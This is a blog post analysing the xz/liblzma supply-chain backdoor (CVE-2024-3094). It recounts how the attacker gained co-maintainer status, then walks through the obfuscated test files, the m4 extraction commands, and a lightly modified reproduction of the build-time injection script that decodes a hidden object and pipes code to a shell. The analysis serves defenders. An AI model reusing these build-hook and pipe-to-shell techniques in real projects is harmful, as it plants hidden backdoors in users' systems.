---
title: OpenSSH Backdoor using Compression Library
description: A backdoor was found in the xz compression library which allowed an attacker to gain access to a system using SSH.
date: 2024-04-02 12:00:00
tags: [CVE-2024-3094, xz, openssh, backdoor, exploit]
author: Mohamad Khawam
author_image: https://avatars.githubusercontent.com/mkhawam
image: /img/xz_backdoor.png
---

OpenSSH is a program that is installed automatically on a bunch of Linux distros. It allows users to access and control a target computer from anywhere using their username and password and SSH(Secure Shell) connection back to the user. OpenSSH depends on specific libraries to function. One of these libraries, XZ, included a backdoor that overwrote its authentication process, allowing the attacker to enter.

Xz is a compression utility similar to Gunzip, which allows developers to compress their files into .xz extensions—making them easier to transport. The utility was organically maintained by Lasse Collin around 2009. Many repos, such as OpenSSH, utilize it to compress data.

## How did this happen?

The attacker targeted the XZ build process, disguising the malicious code in the build process of liblzma, first by adding some staging code into the test directory of the GitHub repo. While not initially malicious, these stages had a significant effect when the code to launch the payload ended up in the tarball.

The first commit happened Friday, Feb 23 at 23:09, where two files were added as _/tests/files/bad-3-corrupt_lzma2.xz/_ and _tests/files/good-large_compressed.lzma_. This commit was labeled "just adding a few test files" to the directory. Another commit happened on Saturday, Mar 9, at 10:18, where the compressed code was modified.

The attacker then released a tarball, which included a prebuilt step. This step extracted the test files and used them to modify the linkers in the liblzma code. They were effectively linking real functions to the ones they injected.

Before the attacker was a maintainer themselves, they offered to help the sole maintainer of the repo after they were going through a mental health episode. The attacker also might have used the maintainer's mental health against him to take over by commenting under the mailing list. They were trying to get the original maintainer to quit their position. This ended up with the attacker becoming a co-maintainer on the repo.

## Analysis

GitHub had taken down the repo, but I found the xz lib on https://git.tukaani.org/?p=xz.git after downloading it to a vm. I had taken some precautions, such as taking a snapshot of the VM before continuing. The suspect compressed files are in the test directory of the repo.

### Step one - The files

After catting the bad-3-corrupt_lzma2.xz file, the resulting bunch of data contained the string Hello World in the middle, a little message from the attacker. Then, after decompressing the file, the data was malformed, meaning decompressing it will not work.
![Picture of corrupted data](/img/corrupt_xz.png)

There were three separate headers, _7zXZ_, inside the file. This file has three separate compression streams. The first stream is located from 0-72 bytes in and contains the following

```
####Hello####
```

The next stream was located between 73-440 and but was corrupted

The last stream was located between 440-512 and was simply

```
####World####
```

### Step two - Decorruption!

The corruption of the xz stream is a sign of obfuscation and tapering.

The target script was included in a tarball of v5.6.0 and v5.6.1. Under m4 was a script called build-to-host.m4, which isn't included in the git rep. The run build process runs this script. It changes many bytes inside the code to other bytes using the tr command. As cited here, [gynvael](https://gynvael.coldwind.pl/?lang=en&id=782).

In the build script, a few variables get defined, the first being gl_am_configmake, which starts the activities.

```sh
  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
```

This gets the location of the bad-3-corrupt_lzma2.xz in the test directory

```sh
./tests/files/bad-3-corrupt_lzma2.xz
```

Another variable to be defined is the gl_path_map,

```sh
  gl_path_map='tr "\t \-_" " \t_\-"'
```

This command translates characters inside a file. This will be used inside the script to change values inside the compressed file.

After filtering through the script, the bad code that is left is

```sh
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
gl_path_map='tr "\t \-_" " \t_\-"'
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
# gets set to xz
# checks for path
if test "x$gl_am_configmake" != "x"; then
    # translates file and unpacks bad-3-corrupt_lzma2.xz
    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
else
    gl_[$1]_config=''
fi

# Note: executing this code can lead to the payload to be executed.
#_LT_TAGDECL([], [gl_path_map], [2])dnl
#_LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
#_LT_TAGDECL([], [gl_am_configmake], [2])dnl
#_LT_TAGDECL([], [[$1]_c_make], [2])dnl
#_LT_TAGDECL([], [gl_[$1]_config], [2])dnl
#AC_SUBST([$1_c_make])
```

Running just the transform line returns

```sh
####Hello####
#  Z .hj
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
    srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####
xz: (stdin): Unexpected end of input
```

After unpacking the now uncorrupted bad-3-corrupt_lzma2.xz, we see an unpacker for the good-large_compressed.lzma, which manipulates the compressed.lzma file and pipes it to a shell.

### Step Three - The Script!

After executing this without the /bin/sh, we get a script that injects a function is_arch_extension_supported

The code below is a modified version of the script.

```sh

if test -f /bin/sh; then
    echo "Please do not run this script its bad code"
    exit 0
fi
if test -f /bin/bash; then
    echo "Please do not run this script its bad code"
    exit 0
fi

# Key behavior throughout, using x before checking for ENVIRONMENT

# Sets up pic flags for ggc compiler
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections\""
O="^pic_flag=\" -fPIC -DPIC\"$"
# Sets up some key vars
R="is_arch_extension_supported" # target function
x="__get_cpuid("
p="good-large_compressed.lzma" # original in git dir
U="bad-3-corrupt_lzma2.xz"  # original in git dir
if test -f config.status; then

    # set up vars for some key tools like GCC
    eval `grep ^LD=\'\/ config.status`
    eval `grep ^CC=\' config.status`
    eval `grep ^GCC=\' config.status`
    eval `grep ^srcdir=\' config.status`
    eval `grep ^build=\'x86_64 config.status`
    eval `grep ^enable_shared=\'yes\' config.status`
    eval `grep ^enable_static=\' config.status`
    eval `grep ^gl_path_map=\' config.status`

    if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
        exit 0
    fi
    if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
        exit 0
    fi
    if test "x$enable_shared" != "xyes";then
        exit 0
    fi
    # checks for x86_64
    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
        exit 0
    fi
    # check for is_arch_extension_supported inside crc
    if ! grep -qs "is_arch_extension_supported()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "is_arch_extension_supported()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "is_arch_extension_supported" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
        exit 0
    fi

    # looks for cpuid function in header. this is a function which gets exported in the binary
    if ! grep -qs "__get_cpuid(" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
        exit 0
    fi

    # check for yes and gcc
    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
        exit 0
    fi
    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
        exit 0
    fi
    LDv=$LD" -v"
    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
        exit 0
    fi
    if ! test -f "$srcdir/tests/files/good-large_compressed.lzma" > /dev/null 2>&1;then
        exit 0
    fi
    if ! test -f "$srcdir/tests/files/bad-3-corrupt_lzma2.xz" > /dev/null 2>&1;then
        exit 0
    fi
    # checks for RPM arch
    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
        j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
        if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        z="^am__uninstall_files_from_dir = {"
        if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        w="^am__install_max ="
        if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        E=$z
        if ! grep -qs "^am__uninstall_files_from_dir = {" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        Q="^am__vpath_adj_setup ="
        if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        M="^am__include = include"
        if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        L="^all: all-recursive$"
        if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
        if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
        if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        if ! grep -qs "^pic_flag=\" -fPIC -DPIC\"$" libtool > /dev/null 2>&1;then
            exit 0
        fi
        # replacing the Makefile using the bad-3 file
        # b="am__test = bad-3-corrupt_lzma2.xz"
        sed -i "/^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4/iam__test = bad-3-corrupt_lzma2.xz" src/liblzma/Makefile || true


        # init the strip command
        # d=`tr "\\t \\-_" " \\t_\\-"`
        # b="am__strip_prefix = $(tr "\\t \\-_" " \\t_\\-")"
        sed -i "/^am__install_max =/iam__strip_prefix = $(tr "\\t \\-_" " \\t_\\-")" src/liblzma/Makefile || true
        # b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
        sed -i "/^am__uninstall_files_from_dir = {/iam__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)" src/liblzma/Makefile || true

        # b="\$(top_srcdir)/tests/files/\$(am__test)"
        # s="am__test_dir=\$(top_srcdir)/tests/files/\$(am__test)"

        # setting up test dir to point to bad3
        sed -i "/^am__vpath_adj_setup =/iam__test_dir=\$(top_srcdir)/tests/files/\$(am__test)" src/liblzma/Makefile || true

        h="-Wl,--sort-section=name,-X"
        if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
            h=$("-Wl,--sort-section=name,-X")",-z,now"
        fi
        j="liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X"
        sed -i "/^all: all-recursive$/i$j" src/liblzma/Makefile || true
        sed -i "s/^pic_flag=\" -fPIC -DPIC\"$/pic_flag=\" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections\"/g" libtool || true
        k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
        sed -i "s/$u/$k/" src/liblzma/Makefile || true
        l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
        export top_srcdir='\$(top_srcdir)'; \\\\\n\
        export CC='\$(CC)'; \\\\\n\
        export DEFS='\$(DEFS)'; \\\\\n\
        export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
        export INCLUDES='\$(INCLUDES)'; \\\\\n\
        export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
        export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
        export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
        export CFLAGS='\$(CFLAGS)'; \\\\\n\
        export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
        export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
        export libdir='\$(libdir)'; \\\\\n\
        export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
        export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
        sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
        sed -i "/$m/i$l" src/liblzma/Makefile || true
    fi
    # Checks for crc
    elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then

    # Checks for is_arch_extension_supported function
    if ! grep -qs "is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
        exit 0
    fi
    if ! grep -qs "is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
        exit 0
    fi
    if ! grep -qs "is_arch_extension_supported" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
        exit 0
    fi

    # Checks for get_cpuid
    if ! grep -qs "__get_cpuid(" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
        exit 0
    fi
    # checks for pic_flag are set properly
    if ! grep -qs "pic_flag=\" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections\"" ../../libtool; then
        exit 0
    fi
    if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
        exit 0
    fi
    if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
        exit 0
    fi

    # Starting to inject crc binary
    N=0
    W=0
    Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
    # the values here need to come out to true else the next command fails
    if test -z "$Y"; then
        N=0
        W=88792
    else
        N=88792
        W=0
    fi

    # This step creates a ELF file and injects it into liblzma_la-crc64-fast.o
    xz -dc $top_srcdir/tests/files/good-large_compressed.lzma | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | $((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
    if ! test -f liblzma_la-crc64-fast.o; then
        exit 0
    fi

    cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true


    # Changes the defination of is_arch_extension_supported
    V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
    if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
    sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
    sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \

    # Compiling the crc object
    $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
        cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
        if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
        sed "/include \"crc32_arm64.h\"/a \\$V" | \
        sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
        $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections -o .libs/liblzma_la-crc32_fast.o; then
            if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
                if test ! -f .libs/liblzma.so; then
                    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
                fi
                rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
            else
                mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
            fi
            rm -f .libs/liblzma_la-crc32-fast.o || true
            rm -f .libs/liblzma_la-crc64-fast.o || true
        else
            mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
            mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
        fi
    else
        mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
    fi
    rm -f liblzma_la-crc64-fast.o || true
fi

```

This is a large block of commands, so we should break it down; the script starts by initializing some variables. These are strings that will be used later on. It steps up some pic_flags, a function name. a get cpu id command, and the original payload.

Then, the script runs a bunch of operating system checks to ensure that it checks for a specific function called is_arch_extension_supported, which is located in crc64_fast, crc32_fast, and crc_x86_clmul.h.

After the script checks for the x86_64 architecture, it will modify the Makefile if it finds that it's running an x86 system. Adding certain flags and libdeps into the MakeFile of src/liblzma/

The script then uses the same command as before by bit mapping good-large_compressed.lzma and creates a liblzma_la-crc64-fast.o file, which is an ELF file.

The final thing this script does is modify the crc32_fast.c and crc64_fast.c files and replaces the is_arch_extension_supported() name with \_is_arch_extension_supported(). Interestingly, the same person modified the original file, removing a space from is_arch_extension_supported.

### Step Four - The Binary!

The binary looks like an ELF file that was not stripped of its function headers. This means we can look into exactly what the binary was doing

```console
liblzma_la-crc64-fast.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped
```

We can also see here why they were targeting x86-64 in the script above.

Using `objdump -x, we can get the symbol table for the binary and its significance. The functions look like lzma functions, such as parsing, decoding, and other valuable utilities. The ELF also explicitly exports cpuid and get_cpuid, which are used in the crc_x86_clmul header file.

### Conclusion

This CVE is a story of breaking the trust in our external libraries. I think it's important to have checks in place to ensure the programs we run are safe. This also demonstrates how a lack of supervision of the library's developers' use can lead to adverse consequences. Developers of open and closed-source software need to vet the repos they use. Ensure that the repos also stay secure as they are being maintained. Many open-source repos are volunteer-based, meaning anyone can effectively gain the trust of someone keeping the code and becoming the maintainer. But I also think this is what makes the open-source community as a whole very powerful. It was precisely because this was an open-source repo that we could detect this before it rendered stable.

One thing that shocked me when I first got into programming on GitHub was the idea that I could effectively upload anything into releases. Suppose someone depends on my repo's releases or tags. I could, in theory, upload an entirely different program binary, and no one would know unless they decompiled the program. I think the maintainers' trust throughout the repos lifespan plays a role in more exploits not happening. It's still something that could occur. I wish there were a way to have GitHub or the repo hoster compile the code instead. That way, there's an assurance that the release is genuinely built from the code in one of the git commits, maintaining the integrity we all count on. But, this sadly also comes with a host of problems itself.

![The Worlds Infrastructure](/img/dependency.png)

## Sources

-   https://gynvael.coldwind.pl/?lang=en&id=782
-   https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27
-   https://nvd.nist.gov/vuln/detail/CVE-2024-3094
-   https://bugzilla.redhat.com/show_bug.cgi?id=2272210
-   https://discourse.nixos.org/t/cve-2024-3094-malicious-code-in-xz-5-6-0-and-5-6-1-tarballs/42405
-   https://ubuntu.com/security/CVE-2024-3094
-   https://arstechnica.com/security/2024/03/backdoor-found-in-widely-used-linux-utility-breaks-encrypted-ssh-connections/
-   https://access.redhat.com/security/cve/CVE-2024-3094
-   https://securityboulevard.com/2024/03/critical-backdoor-found-in-xz-utils-cve-2024-3094-enables-ssh-compromise/
-   https://www.openwall.com/lists/oss-security/2024/03/29/4
-   https://tukaani.org/xz-backdoor/
